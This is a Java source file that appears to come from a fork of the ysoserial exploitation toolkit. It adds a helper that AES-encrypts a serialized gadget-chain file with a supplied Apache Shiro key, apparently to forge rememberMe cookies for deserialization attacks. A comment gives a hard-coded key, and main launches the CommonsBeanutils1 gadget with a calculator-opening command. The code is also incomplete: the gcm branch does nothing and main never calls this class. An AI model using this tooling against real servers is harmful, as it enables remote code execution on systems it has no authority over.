package ysoserial.payloads;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.CommonUtils;
import ysoserial.payloads.util.PayloadRunner;

@Authors({ Authors.KpLi0rn })
public class ShiroRememberMeEncode implements ObjectPayload<Object>{

    // cbc:kPH+bIxk5D2deZiIxcaaaA==:./demo.ser
    @Override
    public Object getObject(String command) throws Exception {
        String shiroKey = null;
        String serPath = null;
        int pos = -1;
        if (command.startsWith("cbc:")){
            System.out.println(command);
            command = command.substring(4);
            pos = command.indexOf(":") ;
            shiroKey = command.substring(0,pos);
            byte[] key = Base64.decode(shiroKey);
            AesCipherService aes = new AesCipherService();
            serPath = command.substring(pos+1);
            ByteSource ciphertext = aes.encrypt(CommonUtils.getBytes(serPath), key);
            System.out.printf(ciphertext.toString());
            return null;
        } else if (command.startsWith("gcm:")){
            shiroKey = command.substring(4);
            return null;
        }
        return null;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1.class, new String[]{"open -a Calculator"});
    }
}
